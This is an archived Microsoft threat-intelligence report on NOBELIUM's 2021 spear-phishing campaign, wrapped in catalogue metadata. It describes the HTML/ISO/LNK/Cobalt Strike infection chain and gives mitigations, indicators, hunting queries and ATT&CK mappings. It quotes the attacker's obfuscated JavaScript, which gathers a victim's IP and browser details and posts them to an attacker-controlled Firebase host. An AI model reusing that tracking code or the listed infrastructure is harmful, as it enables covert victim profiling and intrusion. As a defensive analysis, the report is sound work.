{
    "id": "e84bff4d-530a-42e6-9927-eea299330563",
    "created_at": "2023-01-12T14:59:07.065673Z",
    "updated_at": "2025-03-27T02:16:35.011221Z",
    "deleted_at": null,
    "sha1_hash": "139b5751155be71d33f7536c738b1c785343e22e",
    "title": "2021-06-01 - New sophisticated email-based attack from NOBELIUM",
    "authors": "",
    "file_creation_date": "2022-05-28T16:14:56Z",
    "file_modification_date": "2022-05-28T16:14:56Z",
    "file_size": 426856,
    "plain_text": "# New sophisticated email-based attack from NOBELIUM\n\n**[microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/](https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/)**\n\nMay 28, 2021\n\nMicrosoft Threat Intelligence Center (MSTIC) has uncovered a wide-scale malicious email campaign operated by\n[NOBELIUM, the threat actor behind the attacks against SolarWinds, the SUNBURST backdoor,](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/) TEARDROP\nmalware, [GoldMax malware, and other related components. The campaign, initially observed and tracked by](https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/)\nMicrosoft since January 2021, evolved over a series of waves demonstrating significant experimentation. On May\n25, 2021, the campaign escalated as NOBELIUM leveraged the legitimate mass-mailing service, Constant\nContact, to masquerade as a US-based development organization and distribute malicious URLs to a wide variety\nof organizations and industry verticals.\n\nMicrosoft is issuing this alert and new security research regarding this sophisticated email-based campaign that\nNOBELIUM has been operating to help the industry understand and protect from this latest activity. Below, we\nhave outlined attacker motives, malicious behavior, and best practices to protect against this attack. You can also\n[find more information on the Microsoft On The Issues blog.](https://blogs.microsoft.com/on-the-issues/?p=64692)\n\nNote: This is an active incident. We will post more details here as they become available.\n\n**_[Update [05/28/2021]: We published a new blog post detailing NOBELIUM’s latest early-stage toolset,](https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/)_**\n_composed of four tools utilized in a unique infection chain: EnvyScout, BoomBox, NativeZone, and_\n_VaporRage._\n\nNOBELIUM has historically targeted government organizations, non-government organizations (NGOs), think\ntanks, military, IT service providers, health technology and research, and telecommunications providers. With this\nlatest attack, NOBELIUM attempted to target approximately 3,000 individual accounts across more than 150\n[organizations, employing an established pattern of using unique infrastructure and tooling for each target,](https://msrc-blog.microsoft.com/2020/12/21/december-21st-2020-solorigate-resource-center/)\nincreasing their ability to remain undetected for a longer period of time.\n\nThis new wide-scale email campaign leverages the legitimate service Constant Contact to send malicious links\nthat were obscured behind the mailing service’s URL (many email and document services provide a mechanism to\nsimplify the sharing of files, providing insights into who and when links are clicked). Due to the high volume of\n\n\n-----\n\nemails distributed in this campaign, automated email threat detection systems blocked most of the malicious\nemails and marked them as spam. However, some automated threat detection systems may have successfully\ndelivered some of the earlier emails to recipients either due to configuration and policy settings or prior to\ndetections being in place.\n\n[Microsoft 365 Defender delivers coordinated defense against this threat. Microsoft Defender for Office 365 detects](https://www.microsoft.com/en-us/microsoft-365/security/microsoft-365-defender)\n[the malicious emails, and Microsoft Defender for Endpoint detects the malware and malicious behaviors. Due to](https://www.microsoft.com/en-us/microsoft-365/security/endpoint-defender)\nthe fast-moving nature of this campaign and its perceived scope, Microsoft encourages organizations to\ninvestigate and monitor communications matching characteristics described in this report and take the actions\ndescribed below in this article.\n\n[We continue to see an increase in sophisticated and nation-state-sponsored attacks and, as part of our ongoing](https://blogs.microsoft.com/on-the-issues/2021/03/02/new-nation-state-cyberattacks/)\n[threat research and efforts to protect customers, we will continue to provide guidance to the security community](https://blogs.microsoft.com/on-the-issues/2020/12/13/customers-protect-nation-state-cyberattacks/)\non how to secure against and respond to these multi-dimensional attacks.\n\n## Spear-phishing campaign delivers NOBELIUM payloads\n\nThe NOBELIUM campaign observed by MSTIC and detailed in this blog differs significantly from the NOBELIUM\noperations that ran from September 2019 until January 2021, which included the compromise of the SolarWinds\nOrion platform. It is likely that these observations represent changes in the actor’s tradecraft and possible\nexperimentation following widespread disclosures of previous incidents.\n\n### Early testing and initial discovery\n\nAs part of the initial discovery of the campaign in February, MSTIC identified a wave of phishing emails that\nleveraged the Google Firebase platform to stage an ISO file containing malicious content, while also leveraging\nthis platform to record attributes of those who accessed the URL. MSTIC traced the start of this campaign to\nJanuary 28, 2021, when the actor was seemingly performing early reconnaissance by only sending the tracking\nportion of the email, leveraging Firebase URLs to record targets who clicked. No delivery of a malicious payload\nwas observed during this early activity.\n\n### Evolving delivery techniques\n\nIn the next evolution of the campaign, MSTIC observed NOBELIUM attempting to compromise systems through\nan HTML file attached to a spear-phishing email. When opened by the targeted user, a JavaScript within the\nHTML wrote an ISO file to disc and encouraged the target to open it, resulting in the ISO file being mounted much\nlike an external or network drive. From here, a shortcut file (LNK) would execute an accompanying DLL, which\nwould result in Cobalt Strike Beacon executing on the system.\n\n\n-----\n\n_Figure 1. Example Flow of HMTL/ISO infection chain._\n\nHere’s an example of target fingerprinting code leveraging Firebase:\n```\ntry {\nlet sdfgfghj = '';\nlet kjhyui = new XMLHttpRequest();\nkjhyui.open('GET', 'https://api.ipify.org/?format=jsonp?callback=?', false);\nkjhyui.onreadystatechange = function (){\nsdfgfghj = this.responseText;\n}\nkjhyui.send(null);\nlet ioiolertsfsd = navigator.userAgent;\nlet uyio = window.location.pathname.replace('/','');\nvar ctryur = {'io':ioiolertsfsd,'tu':uyio,'sd':sdfgfghj};\nctryur = JSON.stringify(ctryur);\nlet sdfghfgh = new XMLHttpRequest();\nsdfghfgh.open('POST', 'https://eventbrite-com-default-rtdb.firebaseio.com/root.json', false);\nsdfghfgh.setRequestHeader('Content-Type', 'application/json');\nsdfghfgh.send(ctryur);\n} catch (e) {}\n\n```\nSimilar spear-phishing campaigns were detected throughout March, which included the NOBELIUM actor making\nseveral alterations to the accompanying HTML document based on the intended target. MSTIC also observed the\nactor experimenting with removing the ISO from Firebase, and instead encoding it within the HTML document.\nSimilarly, the actor experimented with redirecting the HTML document to an ISO, which contained an RTF\ndocument, with the malicious Cobalt Strike Beacon DLL encoded within the RTF. In one final example of\nexperimentation, there was no accompanying HTML in the phishing email and instead a URL led to an\nindependent website spoofing the targeted organizations, from where the ISO was distributed.\n\nThe phishing message and delivery method was not the only evolving factor in the campaign. In one of the more\ntargeted waves, no ISO payload was delivered, but additional profiling of the target device was performed by an\nactor-controlled web server after a user clicked the link. If the device targeted was an Apple iOS device, the user\nwas redirected to another server under NOBELIUM control, where the since-patched zero-day exploit for CVE2021-1879 was served.\n\n\n-----\n\n### Escalated targeting and delivery\n\nExperimentation continued through most of the campaign but began to escalate in April 2021. During the waves in\nApril, the actor abandoned the use of Firebase, and no longer tracked users using a dedicated URL. Their\ntechniques shifted to encode the ISO within the HTML document and have that responsible for storing target host\ndetails on a remote server via the use of the api.ipify.org service. The actor sometimes employed checks for\nspecific internal Active Directory domains that would terminate execution of the malicious process if it identified an\nunintended environment.\n\nIn May 2021, the actor changed techniques once more by maintaining the HTML and ISO combination, but\ndropped a custom .NET first-stage implant, detected as TrojanDownloader:MSIL/BoomBox, that reported hostbased reconnaissance data to, and downloaded additional payloads from, the Dropbox cloud storage platform.\n\nOn May 25, the NOBELIUM campaign escalated significantly. Using the legitimate mass mailing service Constant\nContact, NOBELIUM attempted to target around 3,000 individual accounts across more than 150 organizations.\nDue to the high-volume campaign, automated systems blocked most of the emails and marked them as spam.\nHowever, automated systems might have successfully delivered some of the earlier emails to recipients.\n\nIn the May 25 campaign, there were several iterations. In one example the emails appear to originate from USAID\n_<ashainfo@usaid.gov>, while having an authentic sender email address that matches the standard Constant_\nContact service. This address (which varies for each recipient) ends in @in.constantcontact.com, and (which\nvaries for each recipient), and a Reply-To address of <mhillary@usaid.gov> was observed. The emails pose as an\nalert from USAID, as seen below.\n\n\n-----\n\n_Figure 2. Example email screenshot._\n\n\n-----\n\nIf the user clicked the link on the email, the URL directs them to the legitimate Constant Contact service, which\nfollows this pattern:\n\n_https://r20.rs6[.]net/tn.jsp?f=_\n\nThe user is then redirected to NOBELIUM-controlled infrastructure, with a URL following this pattern:\n\n_https://usaid.theyardservice[.]com/d/<target_email_address>_\n\nA malicious ISO file is then delivered to the system. Within this ISO file are the following files that are saved in the\n_%USER%\\AppData\\Local\\Temp\\<random folder name>\\ path:_\n\nA shortcut, such as Reports.lnk, that executes a custom Cobalt Strike Beacon loader\nA decoy document, such as ica-declass.pdf, that is displayed to the target\nA DLL, such as Document.dll, that is a custom Cobalt Strike Beacon loader dubbed NativeZone by Microsoft\n\n_Figure 3. ISO file contents. It is worth noting that the “Documents.dll” is a hidden file._\n\n\n-----\n\n_Figure 4. Shortcut which executes the hidden DLL file._\n\nThe end result when detonating the LNK file is the execution of “C:\\Windows\\system32\\rundll32.exe\nDocuments.dll,Open”.\n\nThe successful deployment of these payloads enables NOBELIUM to achieve persistent access to compromised\nsystems. Then, the successful execution of these malicious payloads could enable NOBELIUM to conduct actionon objectives, such as lateral movement, data exfiltration, and delivery of additional malware.\n\nIndicators of compromise (IOCs) for the campaign occurring on May 25 are provided in this blog to help security\nteams to identify actor activity.\n\nMicrosoft security researchers assess that the NOBELIUM’s spear-phishing operations are recurring and have\nincreased in frequency and scope. It is anticipated that additional activity may be carried out by the group using an\nevolving set of tactics.\n\nMicrosoft continues to monitor this threat actor’s evolving activities and will update as necessary. Microsoft 365\nDefender protects customers against the multiple components of this threat: malicious emails, file attachments,\nconnections, malware payloads, other malicious artifacts, and attacker behavior. Refer to the detection details\nbelow for specific detection names and alerts. Additionally, customers should follow defensive guidance and\nleverage advanced hunting to help mitigate variants of actor activity.\n\n## Mitigations\n\n\n-----\n\nApply these mitigations to reduce the impact of this threat. Check the recommendations card for the deployment\nstatus of monitored mitigations.\n\nTurn on [cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-block-at-first-sight-microsoft-defender-antivirus?view=o365-worldwide)\nto cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a\nhuge majority of new and unknown variants.\n[Run EDR in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/edr-in-block-mode?view=o365-worldwide)\nyour non-Microsoft antivirus doesn’t detect the threat or when Microsoft Defender Antivirus is running in\npassive mode. (EDR in block mode works behind the scenes to remediate malicious artifacts that are\ndetected post-breach.)\n[Enable network protection to prevent applications or users from accessing malicious domains and other](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/enable-network-protection?view=o365-worldwide)\nmalicious content on the internet.\n[Enable investigation and remediation in full automated mode to allow Microsoft Defender for Endpoint to](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/automated-investigations?view=o365-worldwide)\ntake immediate action on alerts to resolve breaches, significantly reducing alert volume.\nUse [device discovery to increase your visibility into your network by finding unmanaged devices on your](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/device-discovery?view=o365-worldwide)\nnetwork and onboarding them to Microsoft Defender for Endpoint.\nEnable multifactor authentication (MFA) to mitigate compromised credentials. Microsoft strongly encourages\nall customers download and use passwordless solutions like Microsoft Authenticator to secure your\naccounts.\nFor Office 365 users, see [multifactor authentication support.](https://docs.microsoft.com/en-us/microsoft-365/admin/security-and-compliance/set-up-multi-factor-authentication?view=o365-worldwide&viewFallbackFrom=o365worldwide)\n[For Consumer and Personal email accounts, see how to use two-step verification.](https://support.microsoft.com/en-us/account-billing/how-to-use-two-step-verification-with-your-microsoft-account-c7910146-672f-01e9-50a0-93b4585e7eb4)\n[Turn on the following attack surface reduction rule to block or audit activity associated with this threat: Block](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction)\n_all Office applications from creating child processes. NOTE:_ [Assess rule impact before deployment.](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/evaluate-attack-surface-reduction?view=o365-worldwide)\n\n## Indicators of compromise (IOC)\n\nThis attack is still active, so these indicators should not be considered exhaustive for this observed activity. These\nindicators of compromise are from the large-scale campaign launched on May 25, 2021.\n\nINDICATOR TYPE DESCRIPTION\n\nashainfo@usaid.gov Email Spoofed email\naccount\n\nmhillary@usaid.gov Email Spoofed email\naccount\n\n\n2523f94bd4fba4af76f4411fe61084a7e7d80dec163c9ccba9226c80b8b31252 SHA256\n\nd035d394a82ae1e44b25e273f99eae8e2369da828d6b6fdb95076fd3eb5de142 SHA256\n\n94786066a64c0eb260a28a2959fcd31d63d175ade8b05ae682d3f6f9b2a5a916 SHA256\n\n48b5fb3fa3ea67c2bc0086c41ec755c39d748a7100d71b81f618e82bf1c479f0 SHA256\n\nee44c0692fd2ab2f01d17ca4b58ca6c7f79388cbc681f885bb17ec946514088c SHA256\n\nee42ddacbd202008bcc1312e548e1d9ac670dd3d86c999606a3a01d464a2a330 SHA256\n\n\nMalicious ISO file\n(container)\n\nMalicious ISO file\n(container)\n\nMalicious ISO file\n(container)\n\nMalicious shortcut\n(LNK)\n\nCobalt Strike Beacon\nmalware\n\nCobalt Strike Beacon\nmalware\n\n\nusaid.theyardservice[.]com Domain Subdomain used to\ndistribute ISO file\n\n\n-----\n\nworldhomeoutlet[.]com Domain Subdomain in Cobalt\nStrike C2\n\ndataplane.theyardservice[.]com Domain Subdomain in Cobalt\nStrike C2\n\ncdn.theyardservice[.]com Domain Subdomain in Cobalt\nStrike C2\n\nstatic.theyardservice[.]com Domain Subdomain in Cobalt\nStrike C2\n\n\n192[.]99[.]221[.]77 IP\naddress\n\n83[.]171[.]237[.]173 IP\naddress\n\n\nIP resolved to by\n_worldhomeoutlet[.]com_\n\nIP resolved to by\n*theyardservice[.]com\n\n\ntheyardservice[.]com Domain Actor controlled\ndomain\n\n## Detection details\n\n### Antivirus\n\nMicrosoft Defender Antivirus detects threat components as the following malware:\n\n[Trojan:Win32/NativeZone.C!dha](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:Win32/NativeZone.C!dha&threatId=-2147185566)\n\n### Endpoint detection and response (EDR)\n\nAlerts with the following titles in the Security Center can indicate threat activity on your network:\n\nMalicious ISO File used by NOBELIUM\nCobalt Strike Beacon used by NOBELIUM\nCobalt Strike network infrastructure used by NOBELIUM\n\nThe following alerts might also indicate threat activity associated with this threat. These alerts, however, can be\ntriggered by unrelated threat activity and are not monitored in the status cards provided with this report.\n\nAn uncommon file was created and added to startup folder.\nA link file (LNK) with unusual characteristics was opened.\n\n## Advanced hunting\n\n### Microsoft 365 Defender\n\n**NOTE: The following sample queries lets you search for a week’s worth of events. To explore up to 30 days’ worth**\nof raw data to inspect events in your network and locate potential NOBELIUM mass email-related indicators for\nmore than a week, go to the Advanced Hunting page > Query tab, select the calendar drop-down menu to\nupdate your query to hunt for the Last 30 days.\n\nTo locate possible exploitation activity, run the following query in the Microsoft 365 security center:\n\nNOBELIUM abuse of USAID Constant Contact resources in email data\n\n\n-----\n\nLooks for recent emails to the organization that originate from the original Constant Contact sending infrastructure\nand specifically from the organization that had accounts spoofed or compromised in the campaign detailed in this\nreport. [Run query in Microsoft 365 security center.](https://security.microsoft.com/hunting?query=H4sIAAAAAAAEAI2QzQqCUBCFzzroHURaS7Ro5y6DFraJHkDUzH6uoJabHr7PMWojIQN3fs-ZMzfSXYlK3XRUzbuT00mVPM010wvf6aycXk48zGzoDyhHLcQ8-XRWWirAN1rjHYiW-o_pAm7AXM1nIHvvjN9T9NUS6UnNgW-oV4ZZUM_R1sK9N-6OTg1XTNZgiQqinfGGzNdwFaifghi_92AqMsvjj7YtcX__-C_0WaDUNDdsTOyKIe-z1NSkhvUnbP2_7WE3lMwGXFLxa77e-0liDdIBAAA&runQuery=true&timeRangeId=week)\n```\nEmailUrlInfo\n| where UrlDomain == \"r20.rs6.net\"\n| join kind=inner EmailEvents on $left.NetworkMessageId==$right.NetworkMessageId\n| where SenderMailFromDomain == \"in.constantcontact.com\"\n| where SenderFromDomain == \"usaid.gov\"\n\n```\nNOBELIUM subject lines used in abuse of Constant Contact service\n\nLooks for recent emails to the organization that originate from the original Constant Contact sending infrastructure\nand specifically from the organization that had accounts spoofed or compromised in the campaign detailed in this\nreport. It also specifies email subject keywords seen in phishing campaigns in late May using the term “Special\n[Alert!” in various ways in the subject. Run query in Microsoft 365 security center.](https://security.microsoft.com/hunting?query=H4sIAAAAAAAEAI2SS2vCQBSFz1rofwihiwoSpItuiguhCi7sRruWaX1UjRNJYkXoj-83d6RkYUoJw32eM-feTK6VaiWa6aR37Yg-iOfYUgdVVAacoxz5vRbYks_pQvZBKbijYbbkcuIeZ4gX8DV-V8-6U0cj2Bxdud6o5JrIa63Cat9wnfVpmBV-7HihGjHeVAQdKZVH9ZVhKz1hvelPf3l2oCJib3YJLlhv7ElDx0hf5DzoMGVhmHtTviaX6dWYz1RKuKZEFZ_TBm9ivAP6S7g2aP8P4tasM9OwtHh6VTbGD7Pf3kCIMjYeFFfc52yGGNf2n-pr_dDYS9udf991Mv1bejOmKNhYG2Pz9SRUHMiFaYsvpe19dfUDjw6wVYICAAA&runQuery=true&timeRangeId=week)\n```\nlet SubjectTerms = pack_array (\"Special\",\"Alert\");\nEmailUrlInfo\n| where UrlDomain == \"r20.rs6.net\"\n| join kind=inner EmailEvents on $left.NetworkMessageId==$right.NetworkMessageId\n| where SenderMailFromDomain == \"in.constantcontact.com\"\n| where SenderFromDomain == \"usaid.gov\"\n| where Subject has_any (SubjectTerms)\n\n### Azure Sentinel\n\n```\nNOBELIUM exploitation search using Azure Sentinel\n\nTo locate possible exploitation activity using Azure Sentinel, customers can find a Sentinel query containing these\n[indicators in this GitHub repository.](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/NOBELIUM_IOCsMay2021.yaml)\n\n## MITRE ATT&CK techniques observed\n\n[This threat makes use of attacker techniques documented in the MITRE ATT&CK framework.](https://attack.mitre.org/)\n\n### Initial access\n\n[T1566.003 Phishing: Spearphishing via Service—NOBELIUM used the legitimate mass mailing service,](https://attack.mitre.org/techniques/T1566/003/)\nConstant Contact to send their emails.\n[T1566.002 Phishing: Spearphishing Link—The emails sent by NOBELIUM includes a URL that directs a](https://attack.mitre.org/techniques/T1566/002/)\nuser to the legitimate Constant Contact service that redirects to NOBELIUM-controlled infrastructure.\n\n### Execution\n\n[T1610 Deploy Container—Payload is delivered via an ISO file which is mounted on target computers.](https://attack.mitre.org/techniques/T1610/)\n[T1204.001 User Execution: Malicious Link—Cobalt Strike Beacon payload is executed via a malicious link](https://attack.mitre.org/techniques/T1204/001/)\n(LNK) file.\n\n### Command and control\n\n[T1071.001 Application Layer Protocol: Web Protocols—Cobalt Strike Beacons call out to attacker](https://attack.mitre.org/techniques/T1071/001/)\ninfrastructure via port 443.\n\n## Learn more\n\n\n-----\n\n[To learn more about Microsoft Security solutions, visit our website. Bookmark the](https://www.microsoft.com/en-us/security/business) [Security blog to keep up with our](https://www.microsoft.com/security/blog/)\n[expert coverage on security matters. Also, follow us at @MSFTSecurity for the latest news and updates on](https://twitter.com/@MSFTSecurity)\ncybersecurity.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-06-01 - New sophisticated email-based attack from NOBELIUM.pdf"
    ],
    "report_names": [
        "2021-06-01 - New sophisticated email-based attack from NOBELIUM.pdf"
    ],
    "threat_actors": [
        {
            "id": "b43e5ea9-d8c8-4efa-b5bf-f1efb37174ba",
            "created_at": "2022-10-25T16:07:24.36191Z",
            "updated_at": "2025-03-27T02:02:10.1909Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "Dark Halo",
                "Nobelium",
                "SolarStorm",
                "StellarParticle",
                "UNC2452"
            ],
            "source_name": "ETDA:UNC2452",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "70872c3a-e788-4b55-a7d6-b2df52001ad0",
            "created_at": "2023-01-06T13:46:39.18401Z",
            "updated_at": "2025-03-27T02:00:03.01553Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "DarkHalo",
                "StellarParticle",
                "NOBELIUM",
                "Solar Phoenix",
                "Midnight Blizzard"
            ],
            "source_name": "MISPGALAXY:UNC2452",
            "tools": [
                "SNOWYAMBER",
                "HALFRIG",
                "QUARTERRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1d3f9dec-b033-48a5-8b1e-f67a29429e89",
            "created_at": "2022-10-25T15:50:23.739197Z",
            "updated_at": "2025-03-27T02:00:55.536417Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "UNC2452",
                "NOBELIUM",
                "StellarParticle",
                "Dark Halo"
            ],
            "source_name": "MITRE:UNC2452",
            "tools": [
                "Sibot",
                "Mimikatz",
                "Cobalt Strike",
                "AdFind",
                "GoldMax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a241a1ca-2bc9-450b-a07b-aae747ee2710",
            "created_at": "2024-06-19T02:03:08.150052Z",
            "updated_at": "2025-03-27T02:05:17.409596Z",
            "deleted_at": null,
            "main_name": "IRON RITUAL",
            "aliases": [
                "Blue Dev 5 ",
                "BlueBravo ",
                "Cloaked Ursa ",
                "CozyLarch ",
                "Dark Halo ",
                "Midnight Blizzard ",
                "NOBELIUM ",
                "StellarParticle ",
                "UNC2452 ",
                "APT29"
            ],
            "source_name": "Secureworks:IRON RITUAL",
            "tools": [
                " Cobalt Strike",
                " EnvyScout",
                " GoldFinder",
                " GoldMax",
                " NativeZone",
                " RAINDROP",
                " SUNBURST",
                " Sibot",
                " TEARDROP",
                " VaporRage",
                "Brute Ratel C4"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f27790ff-4ee0-40a5-9c84-2b523a9d3270",
            "created_at": "2022-10-25T16:07:23.341684Z",
            "updated_at": "2025-03-27T02:02:09.74554Z",
            "deleted_at": null,
            "main_name": "APT 29",
            "aliases": [
                "APT 29",
                "ATK 7",
                "Blue Dev 5",
                "BlueBravo",
                "Cloaked Ursa",
                "CloudLook",
                "Cozy Bear",
                "Dark Halo",
                "Earth Koshchei",
                "Grizzly Steppe",
                "Group 100",
                "ITG11",
                "Iron Hemlock",
                "Iron Ritual",
                "Midnight Blizzard",
                "Minidionis",
                "Nobelium",
                "NobleBaron",
                "Operation Ghost",
                "Operation Office monkeys",
                "Operation StellarParticle",
                "SilverFish",
                "Solar Phoenix",
                "SolarStorm",
                "StellarParticle",
                "TEMP.Monkeys",
                "The Dukes",
                "UNC2452",
                "UNC3524",
                "Yttrium"
            ],
            "source_name": "ETDA:APT 29",
            "tools": [
                "7-Zip",
                "ATI-Agent",
                "AdFind",
                "Agentemis",
                "AtNow",
                "BEATDROP",
                "BotgenStudios",
                "CEELOADER",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobalt Strike",
                "CobaltStrike",
                "CosmicDuke",
                "Cozer",
                "CozyBear",
                "CozyCar",
                "CozyDuke",
                "Danfuan",
                "EnvyScout",
                "EuroAPT",
                "FatDuke",
                "FoggyWeb",
                "GeminiDuke",
                "Geppei",
                "GoldFinder",
                "GoldMax",
                "GraphDrop",
                "GraphicalNeutrino",
                "GraphicalProton",
                "HAMMERTOSS",
                "HammerDuke",
                "LOLBAS",
                "LOLBins",
                "LiteDuke",
                "Living off the Land",
                "MagicWeb",
                "Mimikatz",
                "MiniDionis",
                "MiniDuke",
                "NemesisGemina",
                "NetDuke",
                "OnionDuke",
                "POSHSPY",
                "PinchDuke",
                "PolyglotDuke",
                "PowerDuke",
                "QUIETEXIT",
                "ROOTSAW",
                "RegDuke",
                "Rubeus",
                "SNOWYAMBER",
                "SPICYBEAT",
                "SUNSHUTTLE",
                "SeaDaddy",
                "SeaDask",
                "SeaDesk",
                "SeaDuke",
                "Sharp-SMBExec",
                "SharpView",
                "Sibot",
                "Solorigate",
                "SoreFang",
                "TinyBaron",
                "WINELOADER",
                "WellMail",
                "WellMess",
                "cobeacon",
                "elf.wellmess",
                "reGeorg",
                "tDiscoverer"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535547,
    "ts_updated_at": 1743041795,
    "ts_creation_date": 1653754496,
    "ts_modification_date": 1653754496,
    "files": {
        "pdf": "https://archive.orkl.eu/139b5751155be71d33f7536c738b1c785343e22e.pdf",
        "text": "https://archive.orkl.eu/139b5751155be71d33f7536c738b1c785343e22e.txt",
        "img": "https://archive.orkl.eu/139b5751155be71d33f7536c738b1c785343e22e.jpg"
    }
}